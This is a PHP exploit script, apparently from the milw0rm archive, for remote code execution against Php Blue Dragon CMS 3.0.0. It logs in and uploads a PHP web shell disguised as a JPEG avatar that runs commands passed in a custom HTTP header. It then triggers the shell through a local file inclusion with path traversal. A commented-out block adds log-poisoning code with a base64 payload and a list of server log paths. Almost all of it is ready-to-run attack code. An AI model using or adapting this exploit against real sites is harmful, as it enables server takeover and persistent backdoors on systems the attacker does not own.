<?php

// Exploit Name: Php Blue Dragon CMS 3.0.0 Code Execution Exploit
//Script Homepage: http://phpbluedragon.pl/

// Autor: Kacper [kacper1964@yahoo.pl]
// Autor Homepage: devilteam.eu  |  kacper.bblog.pl

//Pozdrawiam wszystkich ludzi z DEVIL TEAM, Zapraszam na irc!
//Irc: irc.milw0rm.com:6667 #devilteam 

//Elo

if ($argc<7) {
    print_r('
---------------------------------------------------------------------------
Usage: php '.$argv[0].' host path login password id cmd OPTIONS
host:      target server (ip/hostname)
path:      path to Php Blue Dragon
login:     registered login
password:  password :)
id:        registered user id!
cmd:       a shell command
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' localhost /Php Blue Dragon/ admin admin 1 ls -la
php '.$argv[0].' localhost /Php Blue Dragon/ admin admin 1 ls -la -P1.1.1.1:80
---------------------------------------------------------------------------
');
die;
}
error_reporting(7);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function wyslijpakiet($pakiet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$pakiet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
$host=$argv[1];
$path=$argv[2];
$login=$argv[3];
$haslo=$argv[4];
$id=$argv[5];
$port=80;
$proxy="";
$cmd="";
for ($i=6; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>'-p') and ($temp<>'-P')) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'bad patch!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

/* Use Local include to remotce code executions from logfile in server
echo "insert evil code in logfiles to run local include ...\r\n\r\n";
$hauru2 = base64_decode("PD9waHAgb2JfY2xlYW4oKTsvL1J1Y2hvbXkgemFtZWsgSGF1cnUgOy0pZWNobyIuL".
"i5IYWNrZXIuLkthY3Blci4uTWFkZS4uaW4uLlBvbGFuZCEhLi4uREVWSUwuVEVBTS".
"4udGhlLi5iZXN0Li5wb2xpc2guLnRlYW0uLkdyZWV0ei4uLiI7ZWNobyIuLi5HbyB".
"UbyBERVZJTCBURUFNIElSQzogNzIuMjAuMTguNjo2NjY3ICNkZXZpbHRlYW0iO2Vj".
"aG8iLi4uREVWSUwgVEVBTSBTSVRFOiBodHRwOi8vd3d3LnJhaGltLndlYmQucGwvI".
"jtpbmlfc2V0KCJtYXhfZXhlY3V0aW9uX3RpbWUiLDApO2VjaG8gIkhhdXJ1IjtwYX".
"NzdGhydSgkX1NFUlZFUltIVFRQX0hBVVJVXSk7ZGllOz8+");
$pakiet="GET ".$p.$hauru2." HTTP/1.0\r\n";
$pakiet.="User-Agent: ".$hauru2." Googlebot/2.1\r\n";
$pakiet.="Host: ".$host."\r\n";
$pakiet.="Connection: close\r\n\r\n";
wyslijpakiet($pakiet);
sleep(1);
$paths= array (
"../../../../../var/log/httpd/access_log",
"../../../../../var/log/httpd/error_log",
"../apache/logs/error.log",
"../apache/logs/access.log",
"../../apache/logs/error.log",
"../../apache/logs/access.log",
"../../../apache/logs/error.log",
"../../../apache/logs/access.log",
"../../../../apache/logs/error.log",
"../../../../apache/logs/access.log",
"../../../../../apache/logs/error.log",
"../../../../../apache/logs/access.log",
"../logs/error.log",
"../logs/access.log",
"../../logs/error.log",
"../../logs/access.log",
"../../../logs/error.log",
"../../../logs/access.log",
"../../../../logs/error.log",
"../../../../logs/access.log",
"../../../../../logs/error.log",
"../../../../../logs/access.log",
"../../../../../etc/httpd/logs/access_log",
"../../../../../etc/httpd/logs/access.log",
"../../../../../etc/httpd/logs/error_log",
"../../../../../etc/httpd/logs/error.log",
"../../../../../var/www/logs/access_log",
"../../../../../var/www/logs/access.log",
"../../../../../usr/local/apache/logs/access_log",
"../../../../../usr/local/apache/logs/access.log",
"../../../../../var/log/apache/access_log",
"../../../../../var/log/apache/access.log",
"../../../../../var/log/access_log",
"../../../../../var/www/logs/error_log",
"../../../../../var/www/logs/error.log",
"../../../../../usr/local/apache/logs/error_log",
"../../../../../usr/local/apache/logs/error.log",
"../../../../../var/log/apache/error_log",
"../../../../../var/log/apache/error.log",
"../../../../../var/log/access_log",
"../../../../../var/log/error_log"
);
for ($i=0; $i<=count($paths)-1; $i++)
{$a=$i+2;
echo "[".$a."] Check Path: ".$paths[$i]."\r\n";
echo "remote code execution...wait..\n";
$pakiet ="GET ".$p."pbd_engine.php?phpExt=/../".$paths[$i]." HTTP/1.1\r\n";
$pakiet.="HAURU: ".$cmd."\r\n";
$pakiet.="Host: ".$host."\r\n";
$pakiet.="Connection: Close\r\n\r\n";
wyslijpakiet($pakiet);
if (strstr($html,"Hauru"))
{$temp=explode("Hauru",$html);
die($temp[1]);
}else{echo "can't run evil code :/ ..\n";}}

End of remote local include :)*/

$pakiet ="GET ".$p."index.php HTTP/1.1\r\n";
$pakiet.="Host: ".$host."\r\n";
$pakiet.="Connection: Close\r\n\r\n";
wyslijpakiet($pakiet);
$temp=explode("Set-Cookie: ",$html);
$COOKIE='';
for ($i=1; $i<=1; $i++)
{$temp2=explode(" ",$temp[$i]);
$COOKIE.=" ".$temp2[0];}
echo "COOKIE ".htmlentities($COOKIE)."\r\n";
echo "Login now..\n";
$data   ="login=".$login."&password=".$haslo."&m=login&ms=user&redirect=index.php%3Fm%3Dlogout%26ms%3Dmain_file&pbd_form_send=yes&send=Zaloguj+mnie%21";
$pakiet ="POST ".$p."index.php?m=login HTTP/1.0\r\n";
$pakiet.="Host: ".$host."\r\n";
$pakiet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\r\n";
$pakiet.="Connection: keep-alive\r\n\r\n";
$pakiet.="Referer: http://".$host."index.php?m=login\r\n";
$pakiet.="Cookie: ".htmlentities($COOKIE)."; dragon_stat=yes\r\n";
$pakiet.="Content-Type: application/x-www-form-urlencoded\r\n";
$pakiet.="Content-Length: ".strlen($data)."\r\n";
$pakiet.="Accept: text/plain\r\n";
$pakiet.=$data;
wyslijpakiet($pakiet);
echo "Upload Backdoor File..\n";
$data.='-----------------------------28753143466646
Content-Disposition: form-data; name="icq"

9999999
-----------------------------28753143466646
Content-Disposition: form-data; name="aim"

9999999
-----------------------------28753143466646
Content-Disposition: form-data; name="msn"

99999999
-----------------------------28753143466646
Content-Disposition: form-data; name="email"

Kacper@devilteam.eu
-----------------------------28753143466646
Content-Disposition: form-data; name="gg"


-----------------------------28753143466646
Content-Disposition: form-data; name="website"

http://devilteam.eu
-----------------------------28753143466646
Content-Disposition: form-data; name="country"

Polska
-----------------------------28753143466646
Content-Disposition: form-data; name="city"

DEVIL TEAM
-----------------------------28753143466646
Content-Disposition: form-data; name="work"

Hacking
-----------------------------28753143466646
Content-Disposition: form-data; name="hobby"

Jarac Skuna :)
-----------------------------28753143466646
Content-Disposition: form-data; name="avatar"

./public_images/user_avarts/1.gif
-----------------------------28753143466646
Content-Disposition: form-data; name="avart2"; filename="lol.jpg"
Content-Type: image/jpeg

<?error_reporting(0);set_time_limit(0);echo"Remote_Code:[";passthru($_SERVER[HTTP_HAURU]);echo"]:End";?>
-----------------------------28753143466646
Content-Disposition: form-data; name="sign"

/root
-----------------------------28753143466646
Content-Disposition: form-data; name="timeplace"

1
-----------------------------28753143466646
Content-Disposition: form-data; name="dateformat"

d F Y, l
-----------------------------28753143466646
Content-Disposition: form-data; name="mycode"

yes
-----------------------------28753143466646
Content-Disposition: form-data; name="myemoticons"

yes
-----------------------------28753143466646
Content-Disposition: form-data; name="myhtml"

yes
-----------------------------28753143466646
Content-Disposition: form-data; name="addsign"

yes
-----------------------------28753143466646
Content-Disposition: form-data; name="tellpm"

yes
-----------------------------28753143466646
Content-Disposition: form-data; name="language"

polish-iso8859-2
-----------------------------28753143466646
Content-Disposition: form-data; name="template"

vphptree
-----------------------------28753143466646
Content-Disposition: form-data; name="pass"


-----------------------------28753143466646
Content-Disposition: form-data; name="newpass"


-----------------------------28753143466646
Content-Disposition: form-data; name="newpassrecom"


-----------------------------28753143466646
Content-Disposition: form-data; name="m"

profile
-----------------------------28753143466646
Content-Disposition: form-data; name="ms"

update
-----------------------------28753143466646
Content-Disposition: form-data; name="pbd_form_send"

yes
-----------------------------28753143466646
Content-Disposition: form-data; name="send"

Aktualizuj dane!
-----------------------------28753143466646--

';
$pakiet ="POST ".$p."index.php HTTP/1.0\r\n";
$pakiet.="Referer: http://".$host."index.php?m=profile\r\n";
$pakiet.="Host: ".$host."\r\n";
$pakiet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\r\n";
$pakiet.="Content-Type: application/x-www-form-urlencoded\r\n";
$pakiet.="Content-Length: ".strlen($data)."\r\n";
$pakiet.="Accept: text/plain\r\n";
$pakiet.="Cookie: ".htmlentities($COOKIE)."; dragon_stat=yes\r\n";
$pakiet.="Connection: keep-alive\r\n\r\n";
$pakiet.=$data;
wyslijpakiet($pakiet);
sleep(1);
echo "Run It...\n";
$pakiet ="GET ".$p."pbd_engine.php?phpExt=/../public_images/user_avarts/".$id.".jpg HTTP/1.1\r\n";
$pakiet.="HAURU: ".$cmd."\r\n";
$pakiet.="Host: ".$host."\r\n";
$pakiet.="Connection: Close\r\n\r\n";
wyslijpakiet($pakiet);
if (strstr($html,"Remote_Code:["))
{$temp=explode("]:End",$html);
die($temp[1]);}
echo "Cant find evil file :/    maybe this version script is too old but is not vulnerable ...\r\n";
echo "Go to DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam\r\n";
?>

# milw0rm.com [2007-08-10]
